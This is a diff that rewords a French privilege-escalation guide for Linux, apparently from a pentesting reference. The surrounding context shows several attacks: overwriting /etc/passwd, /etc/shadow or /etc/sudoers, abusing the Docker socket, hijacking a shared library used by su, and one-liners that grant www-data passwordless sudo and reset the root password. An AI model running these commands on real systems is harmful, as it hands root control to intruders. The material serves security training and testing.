@@ -44,14 +44,14 @@ execve(paramList[0], paramList, NULL);
 return 0;
 }
 ```
-## Écraser un fichier pour élever ses privilèges
+## Écraser un fichier pour escalader les privilèges
 
 ### Fichiers courants
 
 - Ajouter un utilisateur avec un mot de passe dans _/etc/passwd_
 - Modifier le mot de passe dans _/etc/shadow_
 - Ajouter un utilisateur aux sudoers dans _/etc/sudoers_
-- Exploiter Docker via le socket Docker, généralement dans _/run/docker.sock_ ou _/var/run/docker.sock_
+- Exploiter docker via le socket docker, généralement dans _/run/docker.sock_ ou _/var/run/docker.sock_
 
 ### Écraser une library
 
@@ -67,8 +67,8 @@ libdl.so.2 => /lib/x86_64-linux-gnu/libdl.so.2 (0x00007fe472c54000)
 libcap-ng.so.0 => /lib/x86_64-linux-gnu/libcap-ng.so.0 (0x00007fe472a4f000)
 /lib64/ld-linux-x86-64.so.2 (0x00007fe473a93000)
 ```
-Dans ce cas, essayons d’usurper `/lib/x86_64-linux-gnu/libaudit.so.1`.\
-Vérifiez donc les fonctions de cette library utilisées par le binaire **`su`** :
+Dans ce cas, essayons de nous faire passer pour `/lib/x86_64-linux-gnu/libaudit.so.1`.\
+Vérifions donc les fonctions de cette library utilisées par le binaire **`su`** :
 ```bash
 objdump -T /bin/su | grep audit
 0000000000000000      DF *UND*  0000000000000000              audit_open
@@ -104,11 +104,11 @@ Maintenant, en appelant simplement **`/bin/su`**, vous obtiendrez un shell en ta
 
 Pouvez-vous faire exécuter quelque chose à root ?
 
-### **www-data to sudoers**
+### **www-data vers sudoers**
 ```bash
 echo 'chmod 777 /etc/sudoers && echo "www-data ALL=NOPASSWD:ALL" >> /etc/sudoers && chmod 440 /etc/sudoers' > /tmp/update
 ```
-### **Changer le mot de passe root**
+### **Modifier le mot de passe root**
 ```bash
 echo "root:hacked" | chpasswd
 ```
